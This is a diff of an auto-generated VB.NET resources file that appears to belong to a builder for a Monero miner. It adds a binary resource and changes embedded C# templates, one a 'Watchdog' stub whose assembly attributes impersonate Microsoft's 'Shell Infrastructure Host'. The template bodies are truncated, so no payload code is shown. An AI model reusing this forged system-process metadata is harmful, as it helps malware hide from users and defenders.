@@ -71,6 +71,16 @@ Namespace My.Resources
         End Property
         
         '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property Mandark() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("Mandark", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
         '''  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
         '''</summary>
         Friend ReadOnly Property Monero() As System.Drawing.Icon
@@ -91,25 +101,26 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized string similar to Imports System.Security.Cryptography
-        '''Imports Microsoft.Win32
-        '''Imports System.Management
-        '''Imports System
-        '''Imports System.Net.Sockets
-        '''Imports Microsoft.VisualBasic
-        '''Imports System.Diagnostics
-        '''Imports System.Reflection
-        '''Imports System.Runtime.InteropServices
-        '''Imports System.Collections.Generic
-        '''Imports System.Drawing
-        '''Imports System.Windows.Forms
-        '''Imports System.IO
-        '''Imports System.IO.Compression
-        '''Imports System.Net
-        '''Imports System.Drawing.Drawing2D
-        '''Imports System.Drawing.Imaging
-        '''Imports System.Threading
-        ''' [rest of string was truncated]&quot;;.
+        '''  Looks up a localized string similar to using System;
+        '''using System.Diagnostics;
+        '''using System.IO;
+        '''using System.IO.Compression;
+        '''using System.Management;
+        '''using System.Reflection;
+        '''using System.Runtime.InteropServices;
+        '''using System.Security.Cryptography;
+        '''using System.Text;
+        '''using System.Threading;
+        '''using Microsoft.Win32;
+        '''#if DefDebug
+        '''using System.Windows.Forms;
+        '''#endif
+        '''
+        '''#if DefAssembly
+        '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
+        '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
+        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
+        '''[assembly: AssemblyProduc [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
@@ -118,12 +129,24 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
+        '''  Looks up a localized string similar to using System;
+        '''using System.Diagnostics;
+        '''using System.IO;
+        '''using System.Management;
+        '''using System.Reflection;
+        '''using System.Security.Cryptography;
+        '''using System.Text;
+        '''using System.Threading;
+        '''
+        '''[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
+        '''[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
+        '''[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
+        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)]
+        '''[assembly: AssemblyFileVersion(&quot;10.0.19041.746&quot;)] [rest of string was truncated]&quot;;.
         '''</summary>
-        Friend ReadOnly Property Project1() As Byte()
+        Friend ReadOnly Property Watchdog() As String
             Get
-                Dim obj As Object = ResourceManager.GetObject("Project1", resourceCulture)
-                Return CType(obj,Byte())
+                Return ResourceManager.GetString("Watchdog", resourceCulture)
             End Get
         End Property
         
